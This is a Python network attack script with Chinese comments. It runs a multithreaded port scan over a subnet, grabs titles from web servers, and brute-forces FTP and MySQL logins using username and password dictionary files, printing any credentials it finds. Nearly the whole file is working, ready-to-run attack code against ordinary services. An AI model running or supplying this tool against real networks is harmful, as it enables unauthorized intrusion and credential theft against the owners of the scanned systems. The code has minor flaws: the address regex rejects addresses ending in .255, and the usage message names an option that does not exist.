import socket,time
from queue import Queue
from IPy import IP
from threading import Thread
import requests,re
import ftplib
import pymysql,sys
import optparse

parse = optparse.OptionParser('usage %prog -p(--ip) <IP地址/子网掩码（24）>')    # 括号里是不加参数时报的注释
parse.add_option('-p','--ip',dest='ips',help='请输入正确格式，如192.168.150.0/24',type=str,action='store',default='127.0.0.1')
(options,args) = parse.parse_args()
parse_ip = options.ips

def getDate():   # 创建队列方法
    ip_port = Queue(-1)    # 队列 先进先出FIFO,-1代表长度无限
    ports = [80,8080,21,22,3306,3389]
    if re.match(r'((([01]{0,1}\d{0,1}\d|2[0-4]\d|25[0-5])\.){3}([01]{0,1}\d{0,1}\d{0,1}\d|2[0-4]\d|25[0-4])(\/([01]{0,1}|2\d|3[0-2])))',str(parse_ip)):
        for ip in IP(data=parse_ip,make_net=1):
            for port in ports:
                ip_port.put((str(ip),port))    # 将ip，port传到ip_port中
        return ip_port  # 保存组合后的队列
    else:
        print('请输入正确格式,-p(--ip) <IP地址> 或者 -P(--ips) <IP网段>')
        exit()

def portscan(i,ip_port):
    socket.setdefaulttimeout(1)    # 超时跳转到下一个线程
    while not ip_port.empty():    # 如果ip_port有意义
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)   # 创建套接字  AF_INET（使用IPv4通信）SOCK_STREAM（面向连接）
        ip,port= ip_port.get()    # 取值取下来放入ip和port中
        address = (ip,port)
        time.sleep(1)
        try:
            s.connect(address)   # 主动初始化TCP服务器连接
            if address[1] == 80 or address[1] == 8080:
                rets = get_title(str(address[0]),address[1])
                print('[+][线程{}]{}: open [{}] 开放web服务 获取title值:'.format(i,address[0],address[1]),end='')
                print(rets)
            elif address[1] == 21:
                ftps = login_ftp(str(address[0]))
                print('[+][线程{}]{}: open [{}] 开放ftp服务 登陆ftp的'.format(i,address[0],address[1]),end='')
                print(ftps)
            elif address[1] == 3306:
                mysqls = login_mysql(str(address[0]))
                print('[+][线程{}]{}: open [{}] 开放mysql服务 登陆mysql的'.format(i,address[0],address[1]),end='')
                print(mysqls)
        except Exception as e:
            s.close()    # 关闭套接字
            print('[-][线程{}]{}: closed [{}] 端口为开放 error {}: '.format(i,address[0],address[1],e))
        s.close()

def get_title(url_ip,url_port):   # 取web首页title
    url = 'http://{}:{}'.format(url_ip,url_port)
    res = requests.get(url=url,timeout=10)
    global ret
    ret = re.search(r'<title>(.*)</title>',res.text)   # 取title值
    return ret.group(0)

def login_ftp(ip):    # 尝试爆破ftp账号密码
    with open('username.txt','r') as f:    # 读取用户字典
        for line1 in f:
            username = line1.strip('\r').strip('\n')     # 根据回车换行进行读取字符
            with open('password.txt','r') as h:    # 读取密码字典
                for line2 in h:
                    password = line2.strip('\r').strip('\n')
                    try:
                        ftp = ftplib.FTP(ip)
                        ftp.login(user=username,passwd=password)    # 用账号密码进行登陆
                        ftp.quit()    # 登陆成功后退出
                        global ftp_success
                        ftp_success = '用户名：{} 密码：{}'.format(username,password)
                        return ftp_success
                    except Exception as e:
                        pass

def login_mysql(ip):    # 尝试mysql账号密码爆破
    with open('username.txt','r') as f:    # 读取用户字典
        for line1 in f:
            username = line1.strip('\r').strip('\n')     # 根据回车换行进行读取字符
            with open('password.txt','r') as h:    # 读取密码字典
                for line2 in h:
                    password = line2.strip('\r').strip('\n')
                    try:
                        db = pymysql.connect(host=ip,user=username,passwd=password)    # 用账号密码进行登陆
                        db.close()
                        #exit()
                        global mysql_success
                        mysql_success = '用户名：{} 密码：{}'.format(username,password)
                        return mysql_success
                    except Exception as e:
                        pass

if __name__ == "__main__":  # 自己调用自己，多线程调用
    ip_port = getDate()   # 将队列方法实例化赋值
    threads = []
    for i in range(10):   #  线程数10
        t = Thread(target=portscan,args=(i,ip_port))    # target+方法 args+方法里的参数
        threads.append(t)    # 赋值
        t.start()   # 开启线程
    for t in threads:
        t.join()   # 阻塞线程